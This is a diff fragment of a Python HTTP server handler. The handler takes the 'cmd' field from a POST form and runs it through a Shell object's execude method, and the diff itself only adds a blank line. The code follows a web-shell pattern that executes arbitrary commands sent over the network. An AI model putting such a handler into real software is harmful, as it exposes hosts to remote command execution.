@@ -17,6 +17,7 @@ class ServerHandler(http.server.SimpleHTTPRequestHandler):
             environ={'REQUEST_METHOD': 'POST',
                      'CONTENT_TYPE': self.headers['Content-Type'],
                      })
+
         shell = Shell()
         message = shell.execude(form.getvalue('cmd'))
         cwd = shell.pwd
